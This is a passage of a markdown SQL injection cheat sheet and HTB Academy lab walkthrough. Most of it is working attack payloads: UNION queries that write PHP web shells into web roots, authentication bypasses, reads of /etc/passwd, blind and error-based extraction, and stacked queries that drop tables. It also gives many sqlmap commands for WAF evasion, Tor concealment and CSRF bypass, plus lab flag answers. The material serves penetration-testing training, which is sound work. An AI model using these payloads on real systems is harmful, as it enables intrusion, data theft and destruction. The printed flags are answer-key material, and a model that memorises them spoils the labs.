-- Deploy web shell (clean output)
cn' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/html/shell.php'-- -

-- Alternative web shell
cn' UNION SELECT "","<?php system($_GET['cmd']); ?>","","" into outfile '/var/www/html/cmd.php'-- -
```

**HTB Academy Solution Path:**
1. ✅ Verify secure_file_priv (empty = unrestricted)
2. ✅ Test write with proof.txt
3. ✅ Deploy shell.php with clean output  
4. ✅ Execute commands via ?0= parameter
5. ✅ Find and read flag file

---

## HTB Academy Skills Assessment: Complete Attack Chain

### Scenario: Web Application with Login Form → Remote Code Execution → Flag Capture

**Target:** Web application with login form and search functionality  
**Goal:** Gain RCE and find flag in / root directory

#### Phase 1: Authentication Bypass

**Step 1: Identify Login Form**
```
Navigate to target website → Find login form
Attempt normal login → No credentials available
```

**Step 2: SQL Injection Authentication Bypass**
```sql
-- Test basic OR injection in username field
admin' OR '1' = '1' -- -

-- Result: Successfully bypassed authentication → "Employee Dashboard"
-- Analysis: OR condition makes query always true
```

#### Phase 2: SQL Injection Discovery & Exploitation

**Step 3: Find Injectable Parameter**
```sql
-- Test search field with single quote
search_term: '

-- Result: SQL error "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version"
-- Analysis: ✅ SQL injection confirmed in search parameter
```

**Step 4: Column Detection**
```sql
-- Test UNION with different column counts
' UNION SELECT 1 -- -                    # Error: different number of columns
' UNION SELECT 1,2 -- -                  # Error: different number of columns  
' UNION SELECT 1,2,3 -- -                # Error: different number of columns
' UNION SELECT 1,2,3,4 -- -              # Error: different number of columns
' UNION SELECT 1,2,3,4,5 -- -            # ✅ Success!

-- Result: 5 columns detected, column 1 hidden (not displayed)
-- Displayed columns: 2, 3, 4, 5
```

#### Phase 3: Privilege Enumeration

**Step 5: Identify Database User**
```sql
-- Check current user
' UNION SELECT 1,user(),3,4,5 -- -

-- Result: "root@localhost" 
-- Analysis: ✅ Root user = High privileges (DBA)
```

**Step 6: Enumerate User Privileges**
```sql
-- List all privileges for current user
' UNION SELECT 1, grantee, privilege_type, is_grantable, 5 FROM information_schema.user_privileges -- -

-- Key findings:
-- FILE privilege: YES ✅ Can read/write files
-- SELECT privilege: YES ✅ Can read data
-- INSERT privilege: YES ✅ Can write data
-- SUPER privilege: YES ✅ Admin operations
```

#### Phase 4: File Operations

**Step 7: Test File Reading**
```sql
-- Read system file to verify FILE privilege
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -

-- Result: Successfully displays /etc/passwd content ✅
-- Analysis: FILE privilege confirmed working
```

**Step 8: Verify Write Restrictions**
```sql
-- Check secure_file_priv setting
' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -

-- Result: SECURE_FILE_PRIV = (empty)
-- Analysis: ✅ No restrictions = Can write anywhere
```

#### Phase 5: Web Shell Deployment

**Step 9: Deploy Web Shell**
```sql
-- Write PHP web shell to web directory
' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -

-- Key considerations:
-- Use /var/www/html/dashboard/ instead of /var/www/html/ (permission denied)
-- Empty strings for clean PHP output
-- cmd parameter for command execution
```

**Step 10: Verify Web Shell**
```bash
# Test web shell with simple command
curl "http://target/dashboard/shell.php?cmd=id"

# Expected output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
# Analysis: ✅ Remote Code Execution achieved!
```

#### Phase 6: Flag Capture

**Step 11: Search for Flag**
```bash
# List root directory contents (clean output)
curl -w "\n" -s http://TARGET_IP:PORT/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'

# Expected output:
bin
boot  
dev
etc
flag_cae1dadcd174.txt  ← TARGET FOUND!
home
lib
...
```

**Step 12: Read Flag**
```bash
# Read flag content (clean output)
curl -w "\n" -s http://TARGET_IP:PORT/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt | sed -e '1,2d'

# Result: [flag_content]
# Analysis: ✅ Flag captured successfully!
```

### Complete Attack Chain Summary

**1. Authentication Bypass:**
```sql
admin' OR '1' = '1' -- -
→ Access Employee Dashboard
```

**2. SQL Injection Discovery:**
```sql
' → SQL error → Injection confirmed
```

**3. UNION Exploitation:**
```sql
' UNION SELECT 1,2,3,4,5 -- -
→ 5 columns, column 1 hidden
```

**4. Privilege Verification:**
```sql
' UNION SELECT 1,user(),3,4,5 -- -                    # root@localhost
' UNION SELECT 1,grantee,privilege_type,is_grantable,5 FROM information_schema.user_privileges -- -  # FILE privilege
' UNION SELECT 1,variable_name,variable_value,4,5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -  # No restrictions
```

**5. Web Shell Deployment:**
```sql
' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
```

**6. Remote Code Execution:**
```bash
curl "http://target/dashboard/shell.php?cmd=ls+/" | sed -e '1,2d'
curl "http://target/dashboard/shell.php?cmd=cat+/flag_*.txt" | sed -e '1,2d'
```

### Key Learning Points

**Practical Considerations:**
- **Directory permissions matter** → `/var/www/html/dashboard/` vs `/var/www/html/`
- **Clean output techniques** → `""` for empty columns, `sed -e '1,2d'` for curl
- **URL encoding** → `+` for spaces in commands
- **File path discovery** → Root directory flag location

**Attack Chain Dependencies:**
1. **Authentication bypass** → Access to vulnerable functionality
2. **SQL injection discovery** → Entry point for exploitation  
3. **Column detection** → Required for UNION queries
4. **Privilege enumeration** → Determines attack capabilities
5. **File operations** → Enables web shell deployment
6. **RCE execution** → Achieves ultimate goal

**Success Indicators:**
- ✅ No SQL errors = Operations succeeded
- ✅ Clean web shell output = Proper deployment
- ✅ Command execution = RCE achieved
- ✅ Flag content = Mission accomplished

---

## Blind SQL Injection

### Boolean-based Blind
```sql
-- Basic true/false test
admin' and 1=1-- -    (true - normal response)
admin' and 1=2-- -    (false - different response)

-- Database version testing
admin' and @@version like '8%'-- -
admin' and length(database())=8-- -

-- Character-by-character extraction
admin' and substring(database(),1,1)='u'-- -
admin' and ascii(substring(database(),1,1))=117-- -

-- Table existence testing
admin' and (select count(*) from users)>=0-- -
```

### Time-based Blind

#### Manual Time-based Payloads
```sql
-- MySQL time delays
admin'; SELECT SLEEP(5)-- -
admin' and (select sleep(5))-- -

-- Conditional time delays
admin' and if(1=1,sleep(5),0)-- -
admin' and if(length(database())=8,sleep(5),0)-- -

-- SQL Server time delays
admin'; WAITFOR DELAY '0:0:5'-- -
admin' and 1=1; WAITFOR DELAY '0:0:5'-- -

-- Oracle time delays
admin' and 1=1 and DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5) is null-- -

-- PostgreSQL time delays
admin'; SELECT pg_sleep(5)-- -
admin' and (select pg_sleep(5))-- -
```

#### Advanced Time-based Data Extraction
```sql
-- Length-based extraction (MySQL)
admin' and if(length(database())=8,sleep(3),0)-- -
admin' and if(length((select table_name from information_schema.tables where table_schema=database() limit 1))=5,sleep(3),0)-- -

-- Character-based extraction (MySQL) 
admin' and if(ascii(substring(database(),1,1))=116,sleep(3),0)-- -    # 't' = 116
admin' and if(ascii(substring(database(),2,1))=101,sleep(3),0)-- -    # 'e' = 101

-- Binary search optimization
admin' and if(ascii(substring(database(),1,1))>100,sleep(3),0)-- -    # > 100 (faster than =)
admin' and if(ascii(substring(database(),1,1))<120,sleep(3),0)-- -    # < 120 (narrow down)

-- Conditional data extraction
admin' and if((select count(*) from users)=3,sleep(5),0)-- -
admin' and if((select username from users limit 1)='admin',sleep(5),0)-- -
```

#### SQLMap Advanced Time-based Attacks

**High-Performance Time-based (Maximum Aggressiveness):**
```bash
# Maximum risk/level for time-based optimization
sqlmap -u "URL" --batch --dump \
  --risk 3 --level 5 \
  --technique=T \
  --timeout=30 \
  --retries=2

# Why risk=3 level=5 for time-based?
# - Tests MORE time-based payloads
# - Uses AGGRESSIVE payload variations  
# - Attempts DEEP parameter testing
# - Higher chance of bypassing filters
```

**JSON Time-based Injection:**
```bash
# JSON payload time-based attack
sqlmap 'http://target/api/action.php' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-raw '{"id":1}' \
  --batch --dump \
  --risk 3 --level 5 \
  --technique=t \
  --random-agent \
  --tamper=between \
  -D production -T final_flag

# Alternative JSON formats
--data-raw '{"user_id":"1*","action":"search"}'  # Parameter in middle
--data-raw '{"filters":{"id":"1"}}'              # Nested JSON
--data-raw '[{"id":1,"type":"user"}]'            # JSON array
```

**Complex Headers + Time-based:**
```bash
# Advanced headers for realistic requests
sqlmap 'http://target/action.php' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://target:42925' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://target:42925/shop.html' \
  -H 'Priority: u=0' \
  --data-raw '{"id":1}' \
  --batch --dump \
  --technique=t \
  --random-agent \
  --tamper=between
```

**Time-based with WAF Bypass:**
```bash
# Time-based + tamper scripts for WAF evasion
sqlmap -u "URL" \
  --technique=T \
  --tamper=between,randomcase,space2comment \
  --random-agent \
  --delay=2 \          # Add delays between requests
  --timeout=60 \       # Longer timeout for slow responses
  --risk=3 --level=5

# Popular tampers for time-based:
--tamper=between                    # Replaces = with BETWEEN, > with NOT BETWEEN
--tamper=space2comment              # Replace spaces with /**/ comments  
--tamper=randomcase                 # SeLeCt instead of SELECT
--tamper=charencode                 # URL encode characters
--tamper=space2plus                 # Replace spaces with +
```

#### Time-based Performance Optimization

**Speed vs Accuracy Trade-offs:**
```bash
# Fast time-based (less accurate)
sqlmap -u "URL" --technique=T --time-sec=1 --timeout=5

# Balanced time-based (recommended)
sqlmap -u "URL" --technique=T --time-sec=3 --timeout=15

# Slow but thorough time-based (high accuracy)  
sqlmap -u "URL" --technique=T --time-sec=5 --timeout=30 --risk=3 --level=5

# Custom timing parameters:
--time-sec=N        # Seconds to wait for time-based response (default: 5)
--timeout=N         # Seconds to wait before timeout (default: 30)
--retries=N         # Retries when connection fails (default: 3)
--delay=N           # Delay in seconds between each HTTP request
```

**Network-Optimized Time-based:**
```bash
# For slow/unstable connections
sqlmap -u "URL" \
  --technique=T \
  --time-sec=7 \       # Longer delay to account for network lag
  --timeout=60 \       # Higher timeout
  --retries=5 \        # More retries
  --delay=3 \          # Delay between requests
  --threads=1          # Single thread for stability

# For fast/stable connections  
sqlmap -u "URL" \
  --technique=T \
  --time-sec=2 \       # Shorter delay
  --timeout=10 \       # Lower timeout
  --threads=5          # Multiple threads
  --batch
```

#### Time-based Troubleshooting

**Common Time-based Issues:**

**1. False Positives (Network Delays):**
```bash
# Problem: Network latency causes false time-based detection
# Solution: Increase time-sec and use multiple tests
sqlmap -u "URL" --technique=T --time-sec=10 --timeout=20

# Verify with manual testing:
curl -w "%{time_total}" -X POST -d '{"id":"1 AND SLEEP(10)"}' URL
# Should show ~10 second delay
```

**2. WAF Blocking Time-based:**
```bash
# Problem: WAF detects SLEEP() function
# Solution: Heavy obfuscation
sqlmap -u "URL" \
  --technique=T \
  --tamper=between,charencode,randomcase,space2comment \
  --random-agent \
  --delay=5

# Alternative: Use different time functions
# MySQL: SLEEP(), BENCHMARK()
# PostgreSQL: pg_sleep()  
# SQL Server: WAITFOR DELAY
```

**3. Timeout Issues:**
```bash
# Problem: Requests timing out before delay completes
# Solution: Increase timeout beyond time-sec
sqlmap -u "URL" \
  --technique=T \
  --time-sec=5 \
  --timeout=20 \       # Always > time-sec
  --retries=3
```

**4. No Time-based Detection:**
```bash
# Problem: Time-based not detected
# Solutions:
1. Increase aggressiveness:
   sqlmap -u "URL" --risk=3 --level=5 --technique=T

2. Try different parameters:
   sqlmap -u "URL" --technique=T -p specific_param

3. Manual confirmation:
   # Test if parameter is injectable
   curl -d "id=1 AND SLEEP(5)" URL  # Should delay
   curl -d "id=1 AND SLEEP(0)" URL  # Should not delay
```

#### Advanced Time-based Scenarios

**Bypassing Length Restrictions:**
```sql
-- When payload length is limited
{"id":"1'+(SLEEP(5))+'"}           # Short MySQL payload
{"id":"1';SELECT(SLEEP(5))--+"}    # Alternative syntax

-- Using shorter functions  
{"id":"1'+(1=BENCHMARK(50000000,MD5(1)))+'"}  # MySQL BENCHMARK (shorter than SLEEP)
```

**Multi-Parameter Time-based:**
```bash
# Test multiple parameters simultaneously
sqlmap -u "URL" \
  --data="param1=1&param2=2&param3=3" \
  --technique=T \
  --risk=3 \
  -p "param1,param2,param3"  # Test all parameters

# Test parameters individually (more precise)
sqlmap -u "URL" --data="param1=1&param2=2" --technique=T -p param1
sqlmap -u "URL" --data="param1=1&param2=2" --technique=T -p param2
```

#### Quick Reference: Advanced Time-based
```bash
# High-performance JSON time-based
sqlmap 'URL' -X POST -H 'Content-Type: application/json' --data-raw '{"id":1}' --technique=t --risk=3 --level=5 --batch --dump

# WAF bypass time-based  
sqlmap -u "URL" --technique=T --tamper=between,randomcase --random-agent --delay=3

# Network-optimized time-based
sqlmap -u "URL" --technique=T --time-sec=7 --timeout=60 --retries=5 --threads=1

# Manual verification
curl -w "%{time_total}" -d "id=1 AND SLEEP(5)" URL    # Should show ~5 seconds
curl -w "%{time_total}" -d "id=1 AND SLEEP(0)" URL    # Should be fast

# Troubleshooting no detection
sqlmap -u "URL" --risk=3 --level=5 --technique=T --time-sec=10 --timeout=30
```

---

## Error-based Injection

### MySQL Error-based
```sql
-- ExtractValue error injection
admin' and extractvalue(1, concat(0x7e, (select database()), 0x7e))-- -
admin' and extractvalue(1, concat(0x7e, (select version()), 0x7e))-- -

-- UpdateXML error injection  
admin' and (updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -

-- Double injection
admin' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```

### SQL Server Error-based
```sql
-- Convert error injection
admin' and 1=convert(int,(select @@version))-- -
admin' and 1=convert(int,(select database()))-- -

-- Cast error injection
admin' and 1=cast((select @@version) as int)-- -
```

---

## WAF Bypass Techniques

### Comment Variations
```sql
-- MySQL comments
admin'/**/or/**/1=1-- -
admin'/*!*/or/*!*/1=1-- -
admin'/*comment*/or/*comment*/1=1-- -

-- Inline comments
admin'/*!/or/*/1=1-- -
admin'/*!50000or*/1=1-- -
```

### Case Variations
```sql
-- Mixed case
Admin' Or '1'='1'-- -
ADMIN' OR '1'='1'-- -
aDmIn' oR '1'='1'-- -
```

### Character Encoding
```sql
-- URL encoding
admin%27%20or%20%271%27%3D%271%27--%20-

-- Double URL encoding  
admin%2527%2520or%2520%25271%2527%253D%25271%2527--%2520-

-- Unicode encoding
admin\u0027 or \u00271\u0027=\u00271\u0027-- -
```

### Alternative Operators
```sql
-- Alternative to OR
admin' || '1'='1'-- -
admin' | '1'='1'-- -

-- Alternative to AND
admin' && '1'='1'-- -
admin' & '1'='1'-- -

-- Alternative to equals
admin' or '1' like '1'-- -
admin' or '1' regexp '1'-- -
```

---

## Second-Order SQL Injection

### Concept
Second-order injections occur when:
1. Malicious input is stored in database
2. Later retrieved and used in another SQL query
3. No sanitization on retrieval/usage

### Example Payload Storage
```sql
-- Register user with malicious username
Username: admin'-- -
Password: anything

-- Later, when profile is updated:
UPDATE users SET email='new@email.com' WHERE username='admin'-- -'
-- Results in: UPDATE users SET email='new@email.com' WHERE username='admin'
```

---

## Advanced Techniques

### Stacked Queries
```sql
-- Multiple statements (when supported)
admin'; INSERT INTO users VALUES ('hacker','password')-- -
admin'; UPDATE users SET password='hacked' WHERE username='admin'-- -
admin'; DROP TABLE logs-- -
```

### NoSQL Injection (for comparison)
```javascript
// MongoDB injection examples
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
```

---

## Prevention and Detection

### Secure Coding Practices
```sql
-- BAD: String concatenation
query = "SELECT * FROM users WHERE username='" + username + "'"

-- GOOD: Parameterized queries
query = "SELECT * FROM users WHERE username=?"
statement.setString(1, username)
```

### Detection Indicators
- Unusual SQL keywords in logs
- Unexpected database errors
- Abnormal response times
- Multiple similar requests with variations
- File system access attempts
- Large data extractions

---

## Quick Reference Commands

### Essential Testing Payloads
```sql
# Basic tests
'
"
`
')
")
`)

# Quick auth bypass
admin'--
admin'#
admin'/*
' or 1=1--
" or 1=1--
' or 'a'='a
" or "a"="a

# Quick UNION tests  
' union select null--
' union select null,null--
' union select null,null,null--

# Quick error triggers
' and (select*from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--
```

### Tool Integration

#### SQLMap Comprehensive Cheat Sheet

##### Basic Usage & Help
```bash
# Help menus
sqlmap -h                                              # View basic help menu
sqlmap -hh                                             # View advanced help menu

# Basic automated scanning
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch   # Run without user input
```

##### Request Types & Methods
```bash
# GET requests (default)
sqlmap -u "http://www.example.com/vuln.php?id=1"      # Basic GET request

# POST requests
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'           # POST with data
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'          # POST with injection point (*)

# PUT requests
sqlmap -u www.target.com --data='id=1' --method PUT    # PUT request

# HTTP request file
sqlmap -r req.txt                                      # Use saved HTTP request file
```

##### Headers & Authentication
```bash
# Cookie handling
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'  # Specify cookies

# Anti-CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

##### Output & Verbosity
```bash
# Traffic logging
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt  # Store traffic

# Verbosity levels
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch     # Verbosity level (0-6)
```

##### Attack Tuning & Advanced Options

#### Prefix/Suffix Customization

**What are Boundaries?**
Every SQLMap payload consists of:
- **Vector**: Core SQL code (e.g., `UNION ALL SELECT 1,2,VERSION()`)
- **Boundaries**: Prefix/suffix formations for proper injection

**When to Use Prefix/Suffix:**
```bash
# Custom boundaries for non-standard injection points
sqlmap -u www.example.com/?q=test --prefix="%'))" --suffix="-- -"
```

**Real Example (HTB Academy Case #6):**
```php
// Vulnerable PHP code:
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";

// Required injection:
sqlmap -u 'http://target/case6.php?col=id' --prefix='`)' --batch -T flag6 --dump

// Resulting SQL:
SELECT id,name,surname FROM users WHERE id LIKE (('test`)) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

#### Level/Risk Settings

**Level (1-5, default 1):**
- **Level 1**: 72 payloads (most common boundaries/vectors)
- **Level 5**: 7,865 payloads (extensive boundary combinations)
- Higher level = more boundaries tested = slower but more thorough

**Risk (1-3, default 1):**
- **Risk 1**: Safe payloads only
- **Risk 2**: Includes medium-risk payloads
- **Risk 3**: Includes OR payloads (dangerous - can modify data)

**Usage Examples:**
```bash
# Conservative (default)
sqlmap -u "URL" --level=1 --risk=1          # 72 payloads

# Moderate thoroughness  
sqlmap -u "URL" --level=3 --risk=2          # ~1,000 payloads

# Maximum thoroughness (slow!)
sqlmap -u "URL" --level=5 --risk=3          # 7,865 payloads

# View payloads being tested
sqlmap -u "URL" -v 3 --level=5              # Verbosity shows [PAYLOAD] details
```

**Risk Level Considerations:**
```bash
# Risk 1: Safe boolean/UNION payloads
[PAYLOAD] 1 AND 7496=4313
[PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz

# Risk 3: Dangerous OR payloads (can modify data!)
[PAYLOAD] 1 OR 1=1                          # ⚠️ Can return all records
[PAYLOAD] 1' OR 'x'='x                      # ⚠️ Authentication bypass
```

#### Advanced Tuning Options

**Status Code Detection:**
```bash
# When TRUE/FALSE responses differ by HTTP status
sqlmap -u "URL" --code=200                  # Fixate TRUE response to HTTP 200
# Example: 200 for valid, 500 for invalid injection
```

**Title-based Detection:**
```bash
# When difference is in HTML <title> tag
sqlmap -u "URL" --titles                    # Compare based on page titles
# Example: "Welcome" vs "Error" in title
```

**String-based Detection:**
```bash
# When specific string appears in TRUE responses
sqlmap -u "URL" --string="success"          # Look for "success" string
sqlmap -u "URL" --string="Welcome"          # Look for "Welcome" string
```

**Text-only Comparison:**
```bash
# Remove HTML tags, compare only visible text
sqlmap -u "URL" --text-only                 # Strip <script>, <style>, etc.
```

#### Technique Selection

**Available Techniques:**
- **B**: Boolean-based blind
- **E**: Error-based  
- **U**: UNION query-based
- **S**: Stacked queries
- **T**: Time-based blind

**Custom Technique Selection:**
```bash
# Skip time-based (avoid timeouts)
sqlmap -u "URL" --technique=BEU             # Boolean + Error + UNION only

# Only UNION attacks
sqlmap -u "URL" --technique=U               # UNION queries only

# Skip boolean blind (faster)
sqlmap -u "URL" --technique=EUS             # Error + UNION + Stacked
```

#### UNION SQLi Tuning

**Column Number Specification:**
```bash
# When you know exact column count
sqlmap -u "URL" --union-cols=17             # Force 17 columns

# Alternative dummy values (instead of NULL)
sqlmap -u "URL" --union-char='a'            # Use 'a' instead of NULL
```

**Oracle FROM Clause:**
```bash
# Oracle requires FROM clause in UNION
sqlmap -u "URL" --union-from=users          # Add FROM users
sqlmap -u "URL" --union-from=dual           # Add FROM dual (Oracle)
```

#### Bypassing Web Application Protections

##### Anti-CSRF Token Bypass

**Problem:** Modern web applications use anti-CSRF tokens that change with each request, breaking automation.

**Solution:** SQLMap can automatically handle CSRF tokens.

```bash
# Automatic CSRF token handling
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# SQLMap will:
1. Parse target response content
2. Search for fresh token values  
3. Use new tokens in subsequent requests
4. Automatically detect common token names (csrf, xsrf, token)
```

**Process Example:**
```
POST parameter 'csrf-token' appears to hold anti-CSRF token. 
Do you want sqlmap to automatically update it in further requests? [y/N] y
```

##### Unique Value Bypass

**Problem:** Application requires unique parameter values to prevent automation.

**Solution:** Randomize parameter values with `--randomize`.

```bash
# Randomize parameter value for each request
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch

# Result: Each request gets unique 'rp' value:
URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216  
URI: http://www.example.com:80/?id=1&rp=36456
```

##### Calculated Parameter Bypass

**Problem:** Application expects calculated parameter values (e.g., MD5 hash validation).

**Solution:** Use `--eval` to calculate parameters dynamically.

```bash
# Calculate MD5 hash parameter dynamically
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()" --batch

# Result: 'h' parameter automatically calculated for each 'id':
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
```

**Common Eval Examples:**
```bash
# MD5 hash calculation
--eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"

# SHA1 hash calculation  
--eval="import hashlib; h=hashlib.sha1(id.encode()).hexdigest()"

# Simple mathematical operations
--eval="sum=int(id)+int(key)"

# Timestamp generation
--eval="import time; ts=int(time.time())"
```

##### IP Address Concealing

**Proxy Usage:**
```bash
# Single proxy
sqlmap -u "URL" --proxy="socks4://177.39.187.70:33283"
sqlmap -u "URL" --proxy="http://proxy.example.com:8080"

# Proxy file (sequential usage)
sqlmap -u "URL" --proxy-file=proxies.txt

# Proxy authentication
sqlmap -u "URL" --proxy="http://user:pass@proxy.example.com:8080"
```

**Tor Network Usage:**
```bash
# Use Tor network (automatic detection of port 9050/9150)
sqlmap -u "URL" --tor

# Verify Tor usage (connects to https://check.torproject.org/)
sqlmap -u "URL" --tor --check-tor

# Expected verification: "Congratulations" message appears
```

##### User-Agent Blacklisting Bypass

**Problem:** Default SQLMap user-agent is blacklisted (`User-agent: sqlmap/1.4.9`).

**Solution:** Use random browser user-agents.

```bash
# Random user-agent from browser pool
sqlmap -u "URL" --random-agent

# Custom user-agent
sqlmap -u "URL" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

##### WAF Detection & Bypass

**WAF Detection Process:**
```bash
# SQLMap automatically tests for WAF presence
# Sends malicious payload with non-existent parameter: ?pfov=...
# Detects protection based on response changes (e.g., 406 Not Acceptable)
# Uses identYwaf library to identify 80+ WAF solutions

# Skip WAF detection (reduce noise)
sqlmap -u "URL" --skip-waf
```

##### Comprehensive Tamper Scripts Reference

**Popular Tamper Scripts:**

| Script | Description | Use Case |
|--------|-------------|----------|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #`, `=` with `BETWEEN # AND #` | Bypass XSS-focused filters |
| `space2comment` | Replaces spaces with `/**/` comments | Common WAF bypass |
| `randomcase` | Randomizes keyword case (`SELECT` → `SEleCt`) | Case-sensitive filters |
| `charencode` | URL-encodes all characters | Character-based filtering |
| `base64encode` | Base64-encodes entire payload | Content inspection bypass |
| `percentage` | Adds `%` before each character (`SELECT` → `%S%E%L%E%C%T`) | Character obfuscation |
| `space2plus` | Replaces spaces with `+` | URL encoding bypass |
| `space2dash` | Replaces spaces with `--` comments | SQL comment injection |
| `versionedkeywords` | Encloses keywords in MySQL version comments | MySQL-specific bypass |
| `modsecurityversioned` | Wraps query in MySQL versioned comments | ModSecurity bypass |

**Advanced Tamper Examples:**
```bash
# Single tamper
sqlmap -u "URL" --tamper=between

# Multiple tampers (chained by priority)
sqlmap -u "URL" --tamper=space2comment,randomcase,charencode

# Heavy obfuscation
sqlmap -u "URL" --tamper=between,randomcase,space2comment,percentage

# ModSecurity bypass
sqlmap -u "URL" --tamper=modsecurityversioned,space2comment

# List all available tampers with descriptions
sqlmap --list-tampers
```

##### Advanced Bypass Techniques

**Chunked Transfer Encoding:**
```bash
# Split POST body into chunks to bypass keyword detection
sqlmap -u "URL" --data="param=value" --chunked

# How it works:
# Normal:   POST body: "id=1 UNION SELECT password FROM users"
# Chunked:  Splits keywords across HTTP chunks to avoid detection
```

**HTTP Parameter Pollution (HPP):**
```bash
# Split payload across multiple same-named parameters
# Example: ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users

# Target platforms concatenate values:
# ASP: Combines all id values into single string
# Bypasses simple parameter filtering
```

##### HTB Academy Case Solutions

**Case #8 (WAF Bypass):**
```bash
# Likely requires tamper scripts
sqlmap -u "http://target/case8.php?id=1" --tamper=space2comment,randomcase --batch --dump
```

**Case #9 (CSRF Protection):**
```bash
# Requires CSRF token handling
sqlmap -u "http://target/case9.php" --data="id=1&csrf=TOKEN" --csrf-token="csrf" --batch --dump
```

**Case #10 (User-Agent Filtering):**
```bash
# Requires random user-agent
sqlmap -u "http://target/case10.php?id=1" --random-agent --batch --dump
```

**Case #11 (Advanced Protection):**
```bash
# Combination of techniques
sqlmap -u "http://target/case11.php?id=1" --random-agent --tamper=between,randomcase --tor --batch --dump
```

##### Quick Reference: Protection Bypass
```bash
# Anti-CSRF tokens
sqlmap -u "URL" --data="id=1&csrf=TOKEN" --csrf-token="csrf"

# Parameter randomization  
sqlmap -u "URL" --randomize=rp

# Calculated parameters
sqlmap -u "URL" --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"

# IP concealing
sqlmap -u "URL" --proxy="socks4://proxy:port" --tor --check-tor

# User-agent bypass
sqlmap -u "URL" --random-agent

# WAF bypass
sqlmap -u "URL" --tamper=space2comment,randomcase,between

# Advanced techniques
sqlmap -u "URL" --chunked --random-agent --tamper=modsecurityversioned
```

#### HTB Academy Examples

**Case #5 (High Risk):**
```bash
# Requires OR payloads (risk level 3)
sqlmap -u "http://target/case5.php?id=1" --risk=3 --batch --dump
# Result: HTB{700_much_r15k_bu7_w0r7h_17}
```

**Case #6 (Custom Boundaries):**
```bash
# Non-standard injection boundaries  
sqlmap -u 'http://target/case6.php?col=id' --prefix='`)' --batch -T flag6 --dump
# Result: HTB{v1nc3_mcm4h0n_15_4570n15h3d}
```

**Case #7 (Advanced Tuning):**
```bash
# Complex scenario requiring multiple options
sqlmap -u 'http://target/case7.php?param=value' --level=5 --risk=3 --technique=BEUST --batch --dump
```

#### Quick Reference: Attack Tuning
```bash
# Basic tuning
sqlmap -u "URL" --prefix="PREFIX" --suffix="SUFFIX"         # Custom boundaries
sqlmap -u "URL" --level=5 --risk=3                          # Maximum detection
sqlmap -u "URL" --technique=BEU                             # Specific techniques

# Advanced detection  
sqlmap -u "URL" --string="success" --text-only             # String + text detection
sqlmap -u "URL" --code=200 --titles                        # Status + title detection

# UNION tuning
sqlmap -u "URL" --union-cols=10 --union-char='a'           # UNION optimization
sqlmap -u "URL" --union-from=dual                          # Oracle FROM clause

# WAF bypass
sqlmap -u "URL" --tamper=space2comment,charencode          # Multiple tampers
```

#### Advanced Database Enumeration

##### Database Schema Analysis

**Complete Schema Enumeration:**
```bash
# Get complete database structure overview
sqlmap -u "http://www.example.com/?id=1" --schema
```

**Example Schema Output:**
```
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

**Analysis Benefits:**
